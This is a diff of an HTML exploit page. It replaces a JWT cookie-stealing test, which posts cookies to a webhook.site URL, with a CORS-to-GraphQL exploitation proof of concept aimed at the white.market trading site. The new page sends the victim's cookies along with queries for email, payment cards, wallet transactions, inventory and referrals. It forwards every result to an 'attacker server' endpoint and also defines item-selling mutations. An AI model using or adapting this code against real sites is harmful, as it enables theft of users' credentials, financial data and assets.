@@ -1,59 +1,593 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>JWT Cookie Test</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>White.market CORS→GraphQL Security Assessment</title>
+    <style>
+        body {
+            font-family: 'Courier New', monospace;
+            background: #0a0a0a;
+            color: #00ff00;
+            padding: 20px;
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+        h1 { color: #ff0000; text-align: center; }
+        .section { 
+            background: #1a1a1a; 
+            border: 1px solid #333; 
+            padding: 15px; 
+            margin: 15px 0;
+            border-radius: 5px;
+        }
+        .success { color: #00ff00; }
+        .fail { color: #ff0000; }
+        .warning { color: #ffaa00; }
+        .info { color: #00aaff; }
+        pre {
+            background: #000;
+            padding: 10px;
+            overflow-x: auto;
+            border-left: 3px solid #00ff00;
+        }
+        button {
+            background: #ff0000;
+            color: #fff;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            margin: 5px;
+            font-family: inherit;
+        }
+        button:hover { background: #cc0000; }
+        .stat {
+            display: inline-block;
+            margin: 10px 20px;
+            font-weight: bold;
+        }
+        #exfil-log {
+            max-height: 300px;
+            overflow-y: scroll;
+            background: #000;
+            padding: 10px;
+            margin-top: 10px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Testing JWT Cookie Access...</h1>
-    <pre id="output"></pre>
+    <h1>🎯 White.market CORS→GraphQL Exploitation PoC</h1>
     
+    <div class="section">
+        <h2>📊 Attack Statistics</h2>
+        <div class="stat success">Successful Queries: <span id="success-count">0</span></div>
+        <div class="stat fail">Failed Queries: <span id="fail-count">0</span></div>
+        <div class="stat warning">Data Exfiltrated: <span id="data-size">0</span> KB</div>
+    </div>
+
+    <div class="section">
+        <h2>🔧 Controls</h2>
+        <button onclick="runBasicRecon()">1. Basic Reconnaissance</button>
+        <button onclick="runUserDataExtraction()">2. Extract User Data</button>
+        <button onclick="runWalletQueries()">3. Wallet/Payment Info</button>
+        <button onclick="runTransactionHistory()">4. Transaction History</button>
+        <button onclick="runInventoryExtraction()">5. Inventory Extraction</button>
+        <button onclick="runDangerousMutations()">⚠️ 6. Test Mutations (DANGEROUS)</button>
+        <button onclick="runFullExploit()">🚀 RUN ALL</button>
+        <button onclick="clearResults()">Clear</button>
+    </div>
+
+    <div class="section">
+        <h2>📡 Query Results</h2>
+        <div id="results"></div>
+    </div>
+
+    <div class="section">
+        <h2>📤 Exfiltration Log</h2>
+        <div id="exfil-log"></div>
+    </div>
+
     <script>
-        const output = document.getElementById('output');
-        const EXFIL = 'https://webhook.site/23b9c460-f601-4ae9-aca0-80a40aedd5d3';
+    // ===== CONFIGURATION =====
+    const CONFIG = {
+        graphqlEndpoint: 'https://api.white.market/graphql/api',
+        exfilEndpoint: 'http://0.0.0.0:5000/exfil', // Replace with your server
+        userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
+        delayBetweenRequests: 300 // ms
+    };
+
+    // ===== STATISTICS =====
+    let stats = {
+        success: 0,
+        fail: 0,
+        dataSize: 0
+    };
+
+    // ===== QUERY LIBRARY =====
+    const QUERIES = {
+        // Basic reconnaissance queries
+        currentUser: {
+            name: "Current User Profile",
+            priority: "HIGH",
+            query: `
+                query CurrentUser {
+                    person_full {
+                        id
+                        username
+                        email
+                        steamId
+                        balance { value currency }
+                        referralBalance { value currency }
+                    }
+                }
+            `
+        },
         
-        // Check if we can read the JWT directly
-        const allCookies = document.cookie;
-        
-        output.textContent = 'All cookies:\n' + allCookies + '\n\n';
-        
-        // Try to find access-token
-        if (allCookies.includes('access-token')) {
-            const match = allCookies.match(/access-token=([^;]+)/);
-            if (match) {
-                const jwt = match[1];
-                output.textContent += '✅ SUCCESS! JWT found:\n' + jwt + '\n\n';
-                
-                // Exfiltrate
-                fetch(EXFIL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        success: true,
-                        jwt: jwt,
-                        timestamp: new Date().toISOString(),
-                        allCookies: allCookies
-                    })
-                });
-                
-                output.textContent += 'JWT sent to webhook!';
-            }
-        } else {
-            output.textContent += '❌ JWT cookie not found in document.cookie\n';
-            output.textContent += 'This means it is HttpOnly.\n\n';
-            output.textContent += 'You will need a relay server to capture it.';
-            
-            // Still send diagnostic info
-            fetch(EXFIL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({
-                    success: false,
-                    reason: 'JWT not in document.cookie - likely HttpOnly',
-                    allCookies: allCookies,
-                    timestamp: new Date().toISOString()
-                })
-            });
+        personStats: {
+            name: "Person Statistics",
+            priority: "HIGH",
+            query: `
+                query PersonStats {
+                    person_stats {
+                        totals {
+                            sold
+                            bought
+                            profit { value currency }
+                        }
+                    }
+                }
+            `
+        },
+
+        walletMethods: {
+            name: "Payment Methods",
+            priority: "CRITICAL",
+            query: `
+                query WalletMethods {
+                    person_wallet_method {
+                        items {
+                            method
+                            isActive
+                        }
+                        cards {
+                            number
+                            type
+                            expiryDate
+                        }
+                    }
+                }
+            `
+        },
+
+        walletTransactions: {
+            name: "Wallet Transactions",
+            priority: "CRITICAL",
+            query: `
+                query WalletTransactions($search: WalletTransactionSearchInput, $pagination: ForwardPaginationInput) {
+                    wallet_transaction_list(search: $search, forwardPagination: $pagination) {
+                        edges {
+                            node {
+                                id
+                                amount { value currency }
+                                status
+                                reason
+                                createdAt
+                                method
+                            }
+                        }
+                    }
+                }
+            `,
+            variables: { pagination: { first: 50 } }
+        },
+
+        marketDeals: {
+            name: "Market Deals (Purchases)",
+            priority: "HIGH",
+            query: `
+                query MarketDeals($search: MarketDealSearchInput, $pagination: ForwardPaginationInput) {
+                    market_deal_list(search: $search, forwardPagination: $pagination) {
+                        totalCount
+                        edges {
+                            node {
+                                id
+                                status
+                                price { value currency }
+                                createdAt
+                                product {
+                                    slug
+                                    item {
+                                        description {
+                                            name
+                                            steamPrice { value currency }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            `,
+            variables: { pagination: { first: 50 } }
+        },
+
+        inventory: {
+            name: "User Inventory",
+            priority: "HIGH",
+            query: `
+                query UserInventory($search: PersonInventorySearchInput, $pagination: ForwardPaginationInput) {
+                    person_inventory(search: $search, forwardPagination: $pagination) {
+                        totalCount
+                        totalCost { value currency }
+                        edges {
+                            node {
+                                id
+                                item {
+                                    appId
+                                    description {
+                                        name
+                                        steamPrice { value currency }
+                                        icon
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            `,
+            variables: { pagination: { first: 100 } }
+        },
+
+        marketOrders: {
+            name: "Market Orders (Sell Orders)",
+            priority: "MEDIUM",
+            query: `
+                query MarketOrders($search: MarketOrderSearchInput, $pagination: ForwardPaginationInput) {
+                    market_order_list(search: $search, forwardPagination: $pagination) {
+                        edges {
+                            node {
+                                id
+                                status
+                                price { value currency }
+                                params {
+                                    param
+                                    value
+                                }
+                            }
+                        }
+                    }
+                }
+            `,
+            variables: { pagination: { first: 50 } }
+        },
+
+        savedFilters: {
+            name: "Saved Filters (Potential PII)",
+            priority: "LOW",
+            query: `
+                query SavedFilters {
+                    person_saved_filters {
+                        filters {
+                            id
+                            name
+                            search {
+                                price { min { value } max { value } }
+                            }
+                        }
+                    }
+                }
+            `
+        },
+
+        notifications: {
+            name: "User Notifications",
+            priority: "MEDIUM",
+            query: `
+                query Notifications($pagination: ForwardPaginationInput) {
+                    person_notification_list(forwardPagination: $pagination) {
+                        edges {
+                            node {
+                                id
+                                category
+                                severity
+                                message
+                                createdAt
+                            }
+                        }
+                    }
+                }
+            `,
+            variables: { pagination: { first: 50 } }
+        },
+
+        referrals: {
+            name: "Referral Information",
+            priority: "MEDIUM",
+            query: `
+                query Referrals {
+                    person_referral_balance {
+                        available { value currency }
+                        pending { value currency }
+                        withdrawn { value currency }
+                    }
+                    person_referral_list {
+                        edges {
+                            node {
+                                person {
+                                    username
+                                }
+                                earned { value currency }
+                            }
+                        }
+                    }
+                }
+            `
+        },
+
+        depositWithdrawalLimits: {
+            name: "Deposit/Withdrawal Limits",
+            priority: "MEDIUM",
+            query: `
+                query Limits {
+                    wallet_deposit_person_limit {
+                        current { value currency }
+                        max { value currency }
+                    }
+                    wallet_withdrawal_person_limit {
+                        current { value currency }
+                        max { value currency }
+                    }
+                }
+            `
         }
+    };
+
+    // Dangerous mutations (for demonstration - DO NOT RUN without authorization)
+    const MUTATIONS = {
+        instantSell: {
+            name: "Instant Sell Items",
+            danger: "CRITICAL",
+            mutation: `
+                mutation InstantSell($input: MarketInstantSellInput!) {
+                    market_instant_sell(input: $input) {
+                        totalPrice { value currency }
+                    }
+                }
+            `
+        },
+        
+        createMarketProduct: {
+            name: "Create Market Listing",
+            danger: "HIGH",
+            mutation: `
+                mutation CreateProduct($items: [MarketProductMultipleInput!]!) {
+                    market_product_multiple(items: $items) {
+                        results {
+                            ... on MarketProduct {
+                                id
+                                slug
+                            }
+                        }
+                    }
+                }
+            `
+        }
+    };
+
+    // ===== CORE EXPLOITATION FUNCTIONS =====
+
+    async function executeGraphQL(queryObj, queryKey) {
+        try {
+            const payload = {
+                query: queryObj.query,
+                variables: queryObj.variables || {},
+                operationName: queryObj.name.replace(/\s+/g, '')
+            };
+
+            const response = await fetch(CONFIG.graphqlEndpoint, {
+                method: 'POST',
+                credentials: 'include', // ⚠️ CRITICAL: Send victim's cookies
+                headers: {
+                    'Content-Type': 'application/json',
+                    'x-accept-language': 'en_US',
+                    'User-Agent': CONFIG.userAgent
+                },
+                body: JSON.stringify(payload)
+            });
+
+            const data = await response.json();
+            
+            if (response.ok && !data.errors) {
+                stats.success++;
+                updateStats();
+                
+                // Calculate data size
+                const dataStr = JSON.stringify(data);
+                const sizeKB = (new Blob([dataStr]).size / 1024).toFixed(2);
+                stats.dataSize += parseFloat(sizeKB);
+                
+                logResult(queryObj.name, true, data, queryObj.priority);
+                
+                // Exfiltrate data
+                await exfiltrateData(queryKey, queryObj.name, data);
+                
+                return { success: true, data };
+            } else {
+                stats.fail++;
+                updateStats();
+                logResult(queryObj.name, false, data.errors || 'Unknown error', queryObj.priority);
+                return { success: false, error: data.errors };
+            }
+        } catch (error) {
+            stats.fail++;
+            updateStats();
+            logResult(queryObj.name, false, error.message, queryObj.priority);
+            return { success: false, error: error.message };
+        }
+    }
+
+    async function exfiltrateData(queryKey, queryName, data) {
+        const exfilData = {
+            timestamp: new Date().toISOString(),
+            queryKey,
+            queryName,
+            data,
+            victim: {
+                userAgent: navigator.userAgent,
+                referrer: document.referrer,
+                origin: window.location.origin
+            }
+        };
+
+        // Log to UI
+        const exfilLog = document.getElementById('exfil-log');
+        const entry = document.createElement('div');
+        entry.className = 'info';
+        entry.textContent = `[${new Date().toLocaleTimeString()}] Exfiltrated: ${queryName} (${(JSON.stringify(data).length / 1024).toFixed(2)} KB)`;
+        exfilLog.appendChild(entry);
+        exfilLog.scrollTop = exfilLog.scrollHeight;
+
+        // Send to attacker server
+        try {
+            await fetch(CONFIG.exfilEndpoint, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(exfilData)
+            });
+        } catch (e) {
+            console.warn('Exfiltration endpoint unavailable:', e.message);
+        }
+    }
+
+    function logResult(queryName, success, data, priority = 'MEDIUM') {
+        const resultsDiv = document.getElementById('results');
+        const div = document.createElement('div');
+        div.className = 'section';
+        
+        const statusClass = success ? 'success' : 'fail';
+        const statusIcon = success ? '✅' : '❌';
+        const priorityBadge = priority === 'CRITICAL' ? '🔴' : priority === 'HIGH' ? '🟠' : '🟡';
+        
+        div.innerHTML = `
+            <h3 class="${statusClass}">${statusIcon} ${priorityBadge} ${queryName}</h3>
+            <pre>${JSON.stringify(data, null, 2)}</pre>
+        `;
+        
+        resultsDiv.insertBefore(div, resultsDiv.firstChild);
+    }
+
+    function updateStats() {
+        document.getElementById('success-count').textContent = stats.success;
+        document.getElementById('fail-count').textContent = stats.fail;
+        document.getElementById('data-size').textContent = stats.dataSize.toFixed(2);
+    }
+
+    async function delay(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    // ===== ATTACK PHASES =====
+
+    async function runBasicRecon() {
+        console.log('[*] Phase 1: Basic Reconnaissance');
+        await executeGraphQL(QUERIES.currentUser, 'currentUser');
+        await delay(CONFIG.delayBetweenRequests);
+        await executeGraphQL(QUERIES.personStats, 'personStats');
+    }
+
+    async function runUserDataExtraction() {
+        console.log('[*] Phase 2: User Data Extraction');
+        await executeGraphQL(QUERIES.currentUser, 'currentUser');
+        await delay(CONFIG.delayBetweenRequests);
+        await executeGraphQL(QUERIES.notifications, 'notifications');
+        await delay(CONFIG.delayBetweenRequests);
+        await executeGraphQL(QUERIES.savedFilters, 'savedFilters');
+    }
+
+    async function runWalletQueries() {
+        console.log('[*] Phase 3: Wallet/Payment Extraction');
+        await executeGraphQL(QUERIES.walletMethods, 'walletMethods');
+        await delay(CONFIG.delayBetweenRequests);
+        await executeGraphQL(QUERIES.depositWithdrawalLimits, 'limits');
+        await delay(CONFIG.delayBetweenRequests);
+        await executeGraphQL(QUERIES.referrals, 'referrals');
+    }
+
+    async function runTransactionHistory() {
+        console.log('[*] Phase 4: Transaction History');
+        await executeGraphQL(QUERIES.walletTransactions, 'walletTransactions');
+        await delay(CONFIG.delayBetweenRequests);
+        await executeGraphQL(QUERIES.marketDeals, 'marketDeals');
+    }
+
+    async function runInventoryExtraction() {
+        console.log('[*] Phase 5: Inventory Extraction');
+        await executeGraphQL(QUERIES.inventory, 'inventory');
+        await delay(CONFIG.delayBetweenRequests);
+        await executeGraphQL(QUERIES.marketOrders, 'marketOrders');
+    }
+
+    async function runDangerousMutations() {
+        const confirmed = confirm(
+            '⚠️ WARNING: You are about to test STATE-CHANGING mutations!\n\n' +
+            'This could:\n' +
+            '- Sell items from the victim\'s inventory\n' +
+            '- Create unauthorized listings\n' +
+            '- Modify account settings\n\n' +
+            'Only proceed if you have explicit authorization.\n\n' +
+            'Continue?'
+        );
+        
+        if (!confirmed) {
+            alert('Mutation testing cancelled.');
+            return;
+        }
+
+        console.log('[*] Phase 6: Testing Mutations (DANGEROUS)');
+        logResult('MUTATION TEST', false, {
+            message: 'Mutation testing requires specific parameters',
+            note: 'Implement mutation tests with valid input data based on your authorization scope'
+        }, 'CRITICAL');
+    }
+
+    async function runFullExploit() {
+        console.log('[*] RUNNING FULL EXPLOITATION CHAIN');
+        
+        clearResults();
+        
+        await runBasicRecon();
+        await delay(CONFIG.delayBetweenRequests * 2);
+        
+        await runUserDataExtraction();
+        await delay(CONFIG.delayBetweenRequests * 2);
+        
+        await runWalletQueries();
+        await delay(CONFIG.delayBetweenRequests * 2);
+        
+        await runTransactionHistory();
+        await delay(CONFIG.delayBetweenRequests * 2);
+        
+        await runInventoryExtraction();
+        
+        console.log('[*] Exploitation complete!');
+        alert(`Exploitation Complete!\n\nSuccessful Queries: ${stats.success}\nFailed Queries: ${stats.fail}\nData Exfiltrated: ${stats.dataSize.toFixed(2)} KB`);
+    }
+
+    function clearResults() {
+        document.getElementById('results').innerHTML = '';
+        document.getElementById('exfil-log').innerHTML = '';
+        stats = { success: 0, fail: 0, dataSize: 0 };
+        updateStats();
+    }
+
+    // ===== AUTO-RUN ON LOAD (Optional) =====
+    window.addEventListener('load', () => {
+        console.log('[*] CORS→GraphQL Exploitation PoC Loaded');
+        console.log('[*] Waiting for user interaction...');
+        
+        // Uncomment to auto-run on page load:
+        // setTimeout(runFullExploit, 2000);
+    });
     </script>
 </body>
 </html>
